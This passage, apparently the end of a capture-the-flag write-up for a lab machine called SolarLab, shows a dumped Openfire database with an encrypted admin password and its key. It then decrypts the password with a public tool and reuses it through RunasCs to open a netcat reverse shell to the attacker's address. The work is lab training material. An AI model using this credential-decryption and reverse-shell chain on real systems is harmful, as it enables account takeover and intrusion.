CREATE MEMORY TABLE PUBLIC.OFPUBSUBITEM(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,PAYLOAD CLOB(1G),CONSTRAINT OFPUBSUBITEM_PK PRIMARY KEY(SERVICEID,NODEID,ID))
CREATE MEMORY TABLE PUBLIC.OFPUBSUBSUBSCRIPTION(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,OWNER VARCHAR(1024) NOT NULL,STATE VARCHAR(15) NOT NULL,DELIVER INTEGER NOT NULL,DIGEST INTEGER NOT NULL,DIGEST_FREQUENCY INTEGER NOT NULL,EXPIRE CHARACTER(15),INCLUDEBODY INTEGER NOT NULL,SHOWVALUES VARCHAR(30) NOT NULL,SUBSCRIPTIONTYPE VARCHAR(10) NOT NULL,SUBSCRIPTIONDEPTH INTEGER NOT NULL,KEYWORD VARCHAR(200),CONSTRAINT OFPUBSUBSUBSCRIPTION_PK PRIMARY KEY(SERVICEID,NODEID,ID))
CREATE MEMORY TABLE PUBLIC.OFPUBSUBDEFAULTCONF(SERVICEID VARCHAR(100) NOT NULL,LEAF INTEGER NOT NULL,DELIVERPAYLOADS INTEGER NOT NULL,MAXPAYLOADSIZE INTEGER NOT NULL,PERSISTITEMS INTEGER NOT NULL,MAXITEMS INTEGER NOT NULL,NOTIFYCONFIGCHANGES INTEGER NOT NULL,NOTIFYDELETE INTEGER NOT NULL,NOTIFYRETRACT INTEGER NOT NULL,PRESENCEBASED INTEGER NOT NULL,SENDITEMSUBSCRIBE INTEGER NOT NULL,PUBLISHERMODEL VARCHAR(15) NOT NULL,SUBSCRIPTIONENABLED INTEGER NOT NULL,ACCESSMODEL VARCHAR(10) NOT NULL,LANGUAGE VARCHAR(255),REPLYPOLICY VARCHAR(15),ASSOCIATIONPOLICY VARCHAR(15) NOT NULL,MAXLEAFNODES INTEGER NOT NULL,CONSTRAINT OFPUBSUBDEFAULTCONF_PK PRIMARY KEY(SERVICEID,LEAF))
ALTER SEQUENCE SYSTEM_LOBS.LOB_ID RESTART WITH 1
SET DATABASE DEFAULT INITIAL SCHEMA PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.SQL_IDENTIFIER TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.YES_OR_NO TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.TIME_STAMP TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CARDINAL_NUMBER TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CHARACTER_DATA TO PUBLIC
GRANT DBA TO SA
SET SCHEMA SYSTEM_LOBS
INSERT INTO BLOCKS VALUES(0,2147483647,0)
SET SCHEMA PUBLIC
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
INSERT INTO OFUSERPROP VALUES('admin','console.rows_per_page','/session-summary.jsp=25')
INSERT INTO OFOFFLINE VALUES('admin',1,'001700223778861',127,'<message from="solarlab.htb" to="admin@solarlab.htb"><body>A server or plugin update was found: Openfire 4.7.5</body></message>')
INSERT INTO OFOFFLINE VALUES('admin',2,'001700223779069',125,'<message from="solarlab.htb" to="admin@solarlab.htb"><body>A server or plugin update was found: Search 1.7.4</body></message>')
INSERT INTO OFOFFLINE VALUES('admin',6,'001714131992714',127,'<message from="solarlab.htb" to="admin@solarlab.htb"><body>A server or plugin update was found: Openfire 4.8.1</body></message>')
INSERT INTO OFOFFLINE VALUES('admin',7,'001714131993136',125,'<message from="solarlab.htb" to="admin@solarlab.htb"><body>A server or plugin update was found: Search 1.7.4</body></message>')
INSERT INTO OFOFFLINE VALUES('admin',11,'001715023572659',127,'<message from="solarlab.htb" to="admin@solarlab.htb"><body>A server or plugin update was found: Openfire 4.8.1</body></message>')
INSERT INTO OFOFFLINE VALUES('admin',12,'001715023572956',125,'<message from="solarlab.htb" to="admin@solarlab.htb"><body>A server or plugin update was found: Search 1.7.4</body></message>')
INSERT INTO OFID VALUES(18,1)
INSERT INTO OFID VALUES(19,16)
INSERT INTO OFID VALUES(23,1)
INSERT INTO OFID VALUES(25,3)
INSERT INTO OFID VALUES(26,2)
INSERT INTO OFID VALUES(27,1)
INSERT INTO OFPROPERTY VALUES('cache.MUCService''conference''RoomStatistics.maxLifetime','-1',0,NULL)
INSERT INTO OFPROPERTY VALUES('cache.MUCService''conference''RoomStatistics.size','-1',0,NULL)
INSERT INTO OFPROPERTY VALUES('cache.MUCService''conference''Rooms.maxLifetime','-1',0,NULL)
INSERT INTO OFPROPERTY VALUES('cache.MUCService''conference''Rooms.size','-1',0,NULL)
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.admin.className','org.jivesoftware.openfire.admin.DefaultAdminProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.auth.className','org.jivesoftware.openfire.auth.DefaultAuthProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.group.className','org.jivesoftware.openfire.group.DefaultGroupProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.lockout.className','org.jivesoftware.openfire.lockout.DefaultLockOutProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.securityAudit.className','org.jivesoftware.openfire.security.DefaultSecurityAuditProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.user.className','org.jivesoftware.openfire.user.DefaultUserProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.vcard.className','org.jivesoftware.openfire.vcard.DefaultVCardProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('update.lastCheck','1715023572956',0,NULL)
INSERT INTO OFPROPERTY VALUES('xmpp.auth.anonymous','false',0,NULL)
INSERT INTO OFPROPERTY VALUES('xmpp.domain','solarlab.htb',0,NULL)
INSERT INTO OFPROPERTY VALUES('xmpp.proxy.enabled','false',0,NULL)
INSERT INTO OFPROPERTY VALUES('xmpp.socket.ssl.active','true',0,NULL)
INSERT INTO OFVERSION VALUES('openfire',34)
INSERT INTO OFSECURITYAUDITLOG VALUES(1,'admin',1700223751042,'Successful admin console login attempt','solarlab.htb','The user logged in successfully to the admin console from address 127.0.0.1. ')
INSERT INTO OFSECURITYAUDITLOG VALUES(2,'admin',1700223756534,'edited file transfer proxy settings','solarlab.htb','port = 7777\u000ahardcodedAddress = null\u000aenabled = false')
INSERT INTO OFMUCSERVICE VALUES(1,'conference',NULL,0)
INSERT INTO OFPUBSUBNODE VALUES('pubsub','',0,'001700223743445','001700223743445',NULL,0,0,0,0,1,1,1,0,0,'publishers',1,0,'open','','','','solarlab.htb','','English','',NULL,'all',-1)
INSERT INTO OFPUBSUBAFFILIATION VALUES('pubsub','','solarlab.htb','owner')
INSERT INTO OFPUBSUBDEFAULTCONF VALUES('pubsub',0,0,0,0,0,1,1,1,0,0,'publishers',1,'open','English',NULL,'all',-1)
INSERT INTO OFPUBSUBDEFAULTCONF VALUES('pubsub',1,1,10485760,0,1,1,1,1,0,1,'publishers',1,'open','English',NULL,'all',-1)

```
{% endcode %}

Throughout this script, the interesting parts are those related to the passwordKey needed to do user password encryption:

```sql
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
```

And the part about the admin user record:

{% code overflow="wrap" %}
```sql
CREATE MEMORY TABLE PUBLIC.OFUSER
(USERNAME VARCHAR(64) NOT NULL,
STOREDKEY VARCHAR(32),
SERVERKEY VARCHAR(32),
SALT VARCHAR(32),
ITERATIONS INTEGER,
PLAINPASSWORD VARCHAR(32),
ENCRYPTEDPASSWORD VARCHAR(255),
NAME VARCHAR(100),
EMAIL VARCHAR(100),
CREATIONDATE VARCHAR(15) NOT NULL,
MODIFICATIONDATE VARCHAR(15) NOT NULL,
CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
```
{% endcode %}

{% code overflow="wrap" %}
```sql
INSERT INTO OFUSER VALUES
('admin', <<<<< USERNAME
'gjMoswpK+HakPdvLIvp6eLKlYh0=', <<<<< STOREDKEY 
'9MwNQcJ9bF4YeyZDdns5gvXp620=', <<<<< SERVERKEY 
'yidQk5Skw11QJWTBAloAb28lYHftqa0x', <<<< SALT 
4096,
NULL, <<<<< PLAINPASSWORD 
'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442', <<<<< ENCRYPTEDPASSWORD 
'Administrator',
'admin@solarlab.htb',
'001700223740785',
'0')
```
{% endcode %}

Unfortunately, the `PLAINPASSWORD` is not stored within the script. However, searching on Google for a way to decrypt the OpenFire database password we find this interesting GitHub repo:

<figure><img src="../../.gitbook/assets/image (684).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/c0rdis/openfire_decrypt" %}

<figure><img src="../../.gitbook/assets/image (685).png" alt=""><figcaption></figcaption></figure>

After compiling the Java class we can run the command and get the Administrator user password for the Openfire server:

{% code overflow="wrap" %}
```bash
java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>

```
Administrator : ThisPasswordShouldDo!@
```

Now try to spawn a shell as Administrator trusting that the Administrator user's Openfire password is the same as on the windows machine:

{% code overflow="wrap" %}
```powershell
.\RunasCs.exe Administrator ThisPasswordShouldDo!@ "C:\temp\nc.exe 10.10.15.101 5555 -e powershell"
```
{% endcode %}

And finally we pwned the machine:

<figure><img src="../../.gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>
